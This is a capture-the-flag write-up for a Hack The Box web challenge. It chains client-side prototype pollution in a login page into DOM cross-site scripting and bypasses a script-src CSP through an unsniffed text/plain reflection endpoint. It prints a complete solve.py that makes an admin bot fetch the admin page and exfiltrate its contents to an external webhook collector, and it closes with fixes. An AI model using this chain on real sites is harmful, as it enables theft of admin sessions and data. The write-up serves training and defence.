## Overview

Sattrack is a Medium **Web** challenge. You get a satellite-monitoring dashboard with partner-level credentials and a separate "Issue Tracker" that runs an admin bot which visits URLs you submit. The flag lives on the admin-only `/admin/users` page. The path from partner to admin is a client-side [prototype pollution](https://cwe.mitre.org/data/definitions/1321.html) bug that chains into [DOM cross-site scripting](https://cwe.mitre.org/data/definitions/79.html) and slips past a `script-src 'self'` Content-Security-Policy.

## The setup

Two apps share one host:

- **Monitor app** (Flask behind nginx) — the dashboard. HS256 JWT auth, roles `partner` and `admin`. You're handed partner creds. `/admin/*` is admin-only; the flag is on `/admin/users`.
- **Issue Tracker** (Express) — an admin bot. `POST /` with `url=<...>` and an admin headless browser visits it. It only accepts URLs matching `^http://127.0.0.1/.*$`.

The monitor app's CSP:

```
default-src 'self'; script-src 'self' 'unsafe-inline'; connect-src *
```

The objective: run JavaScript **in the admin bot's session, on the monitor origin**, read `/admin/users`, and exfiltrate it.

## The technique

Two obvious paths are dead ends first:

- **Forge the JWT** — HS256, but the secret isn't in `rockyou.txt` (despite the teasing `rockyou.xyz` domain). No forgery.
- **Reflected XSS on `/partner/share`** — it reflects our input raw, but with `Content-Type: text/plain`, so a browser won't render it as HTML. Not XSS by itself. (It comes back later as the CSP-bypass gadget.)

The real bug is in the `/login` inline script (simplified):

```js
const userMessage = new URLSearchParams(location.search).get('message');
const userConfig  = JSON.parse(decodeURIComponent(userMessage));   // decoded a SECOND time
let config = mergeObjects(defaultConfig, userConfig);              // recursive merge, honors __proto__

// later:
const settings = window.settings.JS_FILES ? window.settings
                                          : await (await fetch('/api/config')).json();
Object.values(settings.JS_FILES).forEach(src => {
    const s = document.createElement('script'); s.src = src; document.body.appendChild(s);
});
```

Three things line up:

1. **Double decode.** `URLSearchParams.get()` already percent-decodes once, and the code calls `decodeURIComponent` *again* — so `message` is decoded twice. The payload must be **double URL-encoded**, or the second decode corrupts the JSON (a `SyntaxError` in the console is the tell).
2. **Recursive merge = prototype pollution.** `mergeObjects` honors `__proto__`, so `{"__proto__":{"JS_FILES":["<url>"]}}` writes `JS_FILES` onto `Object.prototype`.
3. **The gadget.** `window.settings` starts as `{}`. Normally `window.settings.JS_FILES` is `undefined` and the app fetches the real config. Once `Object.prototype.JS_FILES` is polluted, `window.settings.JS_FILES` *inherits* our array, the ternary goes truthy, and `Object.values(...)` — our array — is loaded as `<script src>`.

We now control a script source, but `script-src 'self'` forbids external scripts.

## Bypassing `script-src 'self'`

We need a **same-origin** URL that returns **JavaScript we control**. That's `/partner/share`:

```
GET /partner/share?type=<X>&data=<Y>   ->   {"<X>": "<Y>"}    (text/plain, NO X-Content-Type-Options: nosniff)
```

Without `nosniff`, a browser will execute a `text/plain` response loaded via `<script src>`. The body is a JSON object, and `{"a":"b"}` at the top of a classic script is a block with a string label — a syntax error, so nothing runs. Break the wrapper from inside `type`:

```
type = foo";<OUR_JS>}//
```

makes the body:

```js
{"foo";<OUR_JS>}//": "..."}
```

which parses as a block `{ "foo"; <OUR_JS> }` (a string-expression statement, then our code), with the trailing `": "..."}` commented out. Valid, and our JS runs.

## Solution

`JS_FILES` points at that share URL, and we feed the bot a `127.0.0.1` login URL carrying the double-encoded pollution. The `solve.py` driver builds the URL and submits it:

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, json, urllib.parse as u, requests

WEBHOOK = sys.argv[1]                 # your OOB collector, e.g. https://webhook.site/<uuid>
TRACKER = sys.argv[2]                 # the Express bot app, e.g. http://<ip>:<tracker_port>

# JS runs in the admin bot's page on the monitor origin (127.0.0.1)
js = ("fetch('/admin/users',{credentials:'include'}).then(r=>r.text()).then(t=>{"
      "var m=t.match(/HTB\\{[^}]*\\}/);"
      "if(m)fetch('%s/?f='+encodeURIComponent(m[0]));}).catch(e=>0)" % WEBHOOK)

TYPE  = 'foo";' + js + '}//'                                   # break {"<type>":..} into valid JS
share = '/partner/share?type=' + u.quote(TYPE, safe='') + '&data='
poll  = json.dumps({"__proto__": {"JS_FILES": [share]}})       # recursive-merge proto pollution
msg   = u.quote(u.quote(poll, safe=''), safe='')               # DOUBLE-encode (decoded twice)
login = "http://127.0.0.1/login?message=" + msg

print("[*] bot URL:", login)
print("[*] bot said:", requests.post(TRACKER + "/", data={"url": login}, timeout=20).text.strip())
print("[*] watch %s for the flag" % WEBHOOK)
```

Run it, then poll your collector:

```bash
python3 solve.py https://webhook.site/<uuid> http://<ip>:<tracker_port>
```

The `<JS>`, running in the admin's session on the monitor origin, does `fetch('/admin/users', {credentials:'include'})`, regexes out `HTB{...}`, and — because `connect-src *` allows outbound to any host — sends it to the collector. The bot has no route back to you, so an external OOB collector is the exfil channel.

The flag lands on the collector:

```
HTB{...}
```

*(Flag redacted.)*

## Why it worked

A recursive **client-side** merge honored `__proto__`, and a property it polluted (`JS_FILES`) was later used directly as a `script.src`. That turns a URL parameter into script execution. The `script-src 'self'` CSP was neutralized by pointing the script at a same-origin reflection endpoint that returned `text/plain` **without** `X-Content-Type-Options: nosniff`, which browsers will still execute as a classic script. The double `decodeURIComponent` was the extra wrinkle — the payload had to be double-encoded to survive it.

A useful debugging note: the bot silently did nothing at first. Replaying the exact `login.html` in a **local headless Chromium** surfaced the console `SyntaxError` from the second decode — that's how the double-encode requirement became obvious. When an admin bot no-ops, reproduce the victim page locally and read its console.

## Fix / defense

- Strip `__proto__`/`constructor`/`prototype` keys before any client-side merge; build config from user input with `Object.create(null)` or a schema validator.
- Never derive a `script.src` (or any DOM sink) from a merged/config value that untrusted input can reach.
- Send `X-Content-Type-Options: nosniff` on every response so `text/plain` can't be loaded as a script; serve reflections as `application/json`.
- Tighten the CSP: drop `'unsafe-inline'`, use nonces/hashes, and make `connect-src` an explicit allow-list instead of `*`.
- Don't decode a parameter twice.

As the flag puts it: client-side prototype pollution is dangerous.
